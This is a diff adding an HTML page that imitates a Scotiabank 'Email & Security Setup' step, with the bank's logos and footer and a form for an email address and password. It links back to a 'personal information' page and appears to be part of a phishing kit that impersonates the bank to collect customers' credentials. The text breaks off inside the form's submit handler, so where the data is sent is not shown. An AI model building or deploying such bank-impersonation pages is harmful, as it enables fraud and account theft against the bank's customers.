@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Email Setup | Scotiabank</title>
+    <style>
+        .loading {
+            display: none;
+        }
+        .loading.active {
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .error-message {
+            display: none;
+            color: #EB121A;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .error-message.show {
+            display: block;
+        }
+        .success-message {
+            display: none;
+            color: #02a95c;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .success-message.show {
+            display: block;
+        }
+        .password-strength {
+            height: 4px;
+            margin-top: 8px;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+        .strength-weak {
+            width: 25%;
+            background-color: #EB121A;
+        }
+        .strength-fair {
+            width: 50%;
+            background-color: #f59e0b;
+        }
+        .strength-good {
+            width: 75%;
+            background-color: #3b82f6;
+        }
+        .strength-strong {
+            width: 100%;
+            background-color: #02a95c;
+        }
+        .input-group {
+            margin-bottom: 32px;
+        }
+        .input-label {
+            display: block;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1d1d1d;
+            margin-bottom: 8px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px 0;
+            border: none;
+            border-bottom: 2px solid #7a7a7a;
+            font-size: 22px;
+            color: #1d1d1d;
+            background: transparent;
+            outline: none;
+        }
+        .input-field:focus {
+            border-bottom-color: #007EAB;
+        }
+        .input-field.error {
+            border-bottom-color: #EB121A;
+        }
+        .input-field.success {
+            border-bottom-color: #02a95c;
+        }
+        .input-icon {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 2px solid #7a7a7a;
+            position: relative;
+        }
+        .input-icon:focus-within {
+            border-bottom-color: #007EAB;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 0;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #7a7a7a;
+        }
+        .password-toggle:hover {
+            color: #007EAB;
+        }
+        .requirements {
+            margin-top: 8px;
+            padding-left: 20px;
+        }
+        .requirement {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+            font-size: 14px;
+            color: #7a7a7a;
+        }
+        .requirement.met {
+            color: #02a95c;
+        }
+        .requirement.unmet {
+            color: #EB121A;
+        }
+        .requirement-icon {
+            width: 16px;
+            height: 16px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col bg-[#F6F7FC]">
+    <div
+        class="md:p-[20px] flex-1 flex flex-col md:justify-center items-center h-screen bg-[#FAFBFD]"
+    >
+        <div
+            class="md:w-[600px] w-full md:mt-[60px] bg-[white] rounded-[8px] shadow-md md:p-[40px] p-[30px] flex flex-col items-center"
+        >
+            <div class="w-full flex items-end">
+                <i data-lucide="mail" class="text-gray-700 ml-auto"></i>
+            </div>
+            
+            <div class="text-center">
+                <h1
+                    class="mt-4 text-[1.6rem] leading-[3.5rem] font-[600] tracking-[-0.025rem] text-[rgb(51,51,51)]"
+                    style="font-family: 'Scotia Headline', Arial, Helvetica, sans-serif"
+                >
+                    Email & Security Setup
+                </h1>
+                <p class="text-[#7a7a7a] text-[16px] mt-2">
+                    Set up your email and password for account access
+                </p>
+            </div>
+            
+            <img
+                src="data:image/png;base64,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"
+                alt="Logo"
+                class="h-[40px] mt-2"
+            />
+
+            <form id="emailForm" class="w-[350px] mt-[50px]">
+                <!-- Email Address -->
+                <div class="input-group">
+                    <label class="input-label">Email Address</label>
+                    <div class="input-icon">
+                        <i data-lucide="mail" class="text-gray-700 w-5 h-5"></i>
+                        <input
+                            type="email"
+                            id="email"
+                            class="input-field"
+                            placeholder="Enter your email address"
+                            required
+                        />
+                    </div>
+                    <div id="emailError" class="error-message"></div>
+                    <p class="text-[#7a7a7a] text-[14px] mt-2">
+                        This will be your primary contact email for account notifications.
+                    </p>
+                </div>
+
+                <!-- Confirm Email -->
+                <div class="input-group">
+                    <label class="input-label">Confirm Email Address</label>
+                    <div class="input-icon">
+                        <i data-lucide="mail-check" class="text-gray-700 w-5 h-5"></i>
+                        <input
+                            type="email"
+                            id="confirmEmail"
+                            class="input-field"
+                            placeholder="Re-enter your email address"
+                            required
+                        />
+                    </div>
+                    <div id="confirmEmailError" class="error-message"></div>
+                </div>
+
+                <!-- Password -->
+                <div class="input-group">
+                    <label class="input-label">Create Password</label>
+                    <div class="input-icon">
+                        <i data-lucide="lock-keyhole" class="text-gray-700 w-5 h-5"></i>
+                        <input
+                            type="password"
+                            id="password"
+                            class="input-field"
+                            placeholder="Create a strong password"
+                            required
+                        />
+                        <button type="button" id="togglePassword" class="password-toggle">
+                            <i data-lucide="eye" class="w-5 h-5"></i>
+                        </button>
+                    </div>
+                    
+                    <!-- Password Strength Indicator -->
+                    <div id="passwordStrength" class="password-strength"></div>
+                    
+                    <!-- Password Requirements -->
+                    <div class="requirements">
+                        <div class="requirement" id="reqLength">
+                            <i data-lucide="x" class="requirement-icon"></i>
+                            <span>At least 8 characters</span>
+                        </div>
+                        <div class="requirement" id="reqUppercase">
+                            <i data-lucide="x" class="requirement-icon"></i>
+                            <span>At least one uppercase letter</span>
+                        </div>
+                        <div class="requirement" id="reqLowercase">
+                            <i data-lucide="x" class="requirement-icon"></i>
+                            <span>At least one lowercase letter</span>
+                        </div>
+                        <div class="requirement" id="reqNumber">
+                            <i data-lucide="x" class="requirement-icon"></i>
+                            <span>At least one number</span>
+                        </div>
+                        <div class="requirement" id="reqSpecial">
+                            <i data-lucide="x" class="requirement-icon"></i>
+                            <span>At least one special character</span>
+                        </div>
+                    </div>
+                    
+                    <div id="passwordError" class="error-message"></div>
+                </div>
+
+                <!-- Confirm Password -->
+                <div class="input-group">
+                    <label class="input-label">Confirm Password</label>
+                    <div class="input-icon">
+                        <i data-lucide="lock-keyhole" class="text-gray-700 w-5 h-5"></i>
+                        <input
+                            type="password"
+                            id="confirmPassword"
+                            class="input-field"
+                            placeholder="Confirm your password"
+                            required
+                        />
+                        <button type="button" id="toggleConfirmPassword" class="password-toggle">
+                            <i data-lucide="eye" class="w-5 h-5"></i>
+                        </button>
+                    </div>
+                    <div id="confirmPasswordError" class="error-message"></div>
+                </div>
+
+                <!-- Terms and Conditions -->
+                <div class="mb-8">
+                    <label class="flex items-start gap-3 text-[#1d1d1d] cursor-pointer">
+                        <input type="checkbox" id="terms" class="hidden peer" required />
+                        
+                        <span
+                            class="w-[26px] h-[26px] rounded-md border-2 border-[#7a7a7a] flex items-center justify-center peer-checked:bg-[#007EAB] peer-checked:border-[#007EAB] mt-1 flex-shrink-0"
+                        >
+                            <svg
+                                class="w-4 h-4 text-white opacity-0 peer-checked:opacity-100"
+                                viewBox="0 0 24 24"
+                                fill="currentColor"
+                            >
+                                <path d="M20.3 5.7l-11 11-5-5 1.4-1.4 3.6 3.6 9.6-9.6z" />
+                            </svg>
+                        </span>
+
+                        <span class="text-[16px] font-[300] leading-relaxed">
+                            I agree to the <a href="#" class="text-[#03749D] font-[600]">Terms of Service</a> and 
+                            <a href="#" class="text-[#03749D] font-[600]">Privacy Policy</a>. I understand that 
+                            Scotiabank will use my email for account communication and security purposes.
+                        </span>
+                    </label>
+                    <div id="termsError" class="error-message"></div>
+                </div>
+
+                <!-- Success Message -->
+                <div id="successMessage" class="success-message"></div>
+
+                <!-- Submit Button -->
+                <div class="w-full flex justify-center mt-[40px]">
+                    <button
+                        id="submitBtn"
+                        type="submit"
+                        class="w-[300px] bg-[#007EAB] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2 hover:bg-[#006c92] transition-colors"
+                    >
+                        <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                        <span class="text-[white] text-[13px]">Complete Setup</span>
+                    </button>
+                </div>
+
+                <!-- Back Link -->
+                <a href="personal.html" class="w-full flex justify-center mt-[20px] items-center">
+                    <i data-lucide="chevron-left" class="text-[#03749D] w-5 h-5"></i>
+                    <span class="text-[#03749D] text-[16px] font-[700] ml-2">
+                        Back to Personal Information
+                    </span>
+                </a>
+            </form>
+        </div>
+
+        <div class="md:flex block gap-[8px] mt-[50px] mb-[70px] text-center">
+            <span>Need help with email setup?</span>
+            <br class="md:hidden"/>
+            <a href="#" class="font-[600] text-[16px]">Contact our support team</a>
+        </div>
+    </div>
+
+    <footer class="pt-6 pb-3 text-sm text-gray-600 bg-[white] shadow-md border border-1 hidden md:block">
+        <div class="flex justify-between mb-4 py-[10px] px-[50px]">
+            <div>
+                <img class="h-9 w-13" src="data:image/png;base64,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" alt="">
+            </div>
+            <div class="flex gap-[20px] font-[300] flex-wrap">
+                <a href="#">Contact Us</a>
+                <a href="#">Security</a>
+                <a href="#">Legal</a>
+                <a href="#">Privacy</a>
+                <a href="#">Accessibility</a>
+                <a href="#">Cookie Settings</a>
+            </div>
+        </div>
+
+        <hr class="mt-4 mb-3" />
+
+        <div class="flex justify-end px-[20px]">
+            <span class="text-[12px]">© Scotiabank. All Rights Reserved.</span>
+        </div>
+    </footer>
+
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <script>
+        // Initialize Lucide icons
+        lucide.createIcons();
+        
+        // Password toggle functionality
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.setAttribute('data-lucide', 'eye-off');
+            } else {
+                passwordInput.type = 'password';
+                icon.setAttribute('data-lucide', 'eye');
+            }
+            lucide.createIcons();
+        });
+        
+        document.getElementById('toggleConfirmPassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('confirmPassword');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.setAttribute('data-lucide', 'eye-off');
+            } else {
+                passwordInput.type = 'password';
+                icon.setAttribute('data-lucide', 'eye');
+            }
+            lucide.createIcons();
+        });
+        
+        // Password strength checker
+        function checkPasswordStrength(password) {
+            let score = 0;
+            const requirements = {
+                length: password.length >= 8,
+                uppercase: /[A-Z]/.test(password),
+                lowercase: /[a-z]/.test(password),
+                number: /[0-9]/.test(password),
+                special: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)
+            };
+            
+            // Count met requirements
+            Object.values(requirements).forEach(met => {
+                if (met) score++;
+            });
+            
+            // Update requirement icons
+            updateRequirementIcons(requirements);
+            
+            // Update strength bar
+            updateStrengthBar(score);
+            
+            return score;
+        }
+        
+        function updateRequirementIcons(requirements) {
+            const requirementIds = {
+                length: 'reqLength',
+                uppercase: 'reqUppercase',
+                lowercase: 'reqLowercase',
+                number: 'reqNumber',
+                special: 'reqSpecial'
+            };
+            
+            Object.entries(requirements).forEach(([key, met]) => {
+                const element = document.getElementById(requirementIds[key]);
+                const icon = element.querySelector('i');
+                
+                if (met) {
+                    element.classList.remove('unmet');
+                    element.classList.add('met');
+                    icon.setAttribute('data-lucide', 'check');
+                } else {
+                    element.classList.remove('met');
+                    element.classList.add('unmet');
+                    icon.setAttribute('data-lucide', 'x');
+                }
+            });
+            
+            lucide.createIcons();
+        }
+        
+        function updateStrengthBar(score) {
+            const strengthBar = document.getElementById('passwordStrength');
+            strengthBar.className = 'password-strength';
+            
+            if (score === 0) {
+                return;
+            } else if (score <= 2) {
+                strengthBar.classList.add('strength-weak');
+            } else if (score === 3) {
+                strengthBar.classList.add('strength-fair');
+            } else if (score === 4) {
+                strengthBar.classList.add('strength-good');
+            } else if (score === 5) {
+                strengthBar.classList.add('strength-strong');
+            }
+        }
+        
+        // Real-time password validation
+        document.getElementById('password').addEventListener('input', function(e) {
+            const password = e.target.value;
+            checkPasswordStrength(password);
+            
+            // Clear error when user starts typing
+            document.getElementById('passwordError').classList.remove('show');
+            e.target.classList.remove('error');
+        });
+        
+        // Clear all error messages
+        function clearErrors() {
+            const errorElements = document.querySelectorAll('.error-message');
+            errorElements.forEach(el => {
+                el.classList.remove('show');
+                el.textContent = '';
+            });
+            
+            const inputElements = document.querySelectorAll('.input-field');
+            inputElements.forEach(el => {
+                el.classList.remove('error');
+                el.classList.remove('success');
+            });
+        }
+        
+        // Show error for specific field
+        function showError(fieldId, message) {
+            const errorElement = document.getElementById(fieldId + 'Error');
+            const inputElement = document.getElementById(fieldId);
+            
+            if (errorElement) {
+                errorElement.textContent = message;
+                errorElement.classList.add('show');
+            }
+            
+            if (inputElement) {
+                inputElement.classList.add('error');
+            }
+        }
+        
+        // Show success for specific field
+        function showSuccess(fieldId) {
+            const inputElement = document.getElementById(fieldId);
+            if (inputElement) {
+                inputElement.classList.remove('error');
+                inputElement.classList.add('success');
+            }
+        }
+        
+        // Validate email format
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // Validate password
+        function validatePassword(password) {
+            const requirements = {
+                length: password.length >= 8,
+                uppercase: /[A-Z]/.test(password),
+                lowercase: /[a-z]/.test(password),
+                number: /[0-9]/.test(password),
+                special: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)
+            };
+            
+            return Object.values(requirements).every(met => met);
+        }
+        
+        // Form submission
+        document.getElementById('emailForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            
+            // Get form values
+            const email = document.getElementById('email').value.trim();
+            const confirmEmail = document.getElementById('confirmEmail').value.trim();
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            const termsAccepted = document.getElementById('terms').checked;
+            
+            // Show loading state
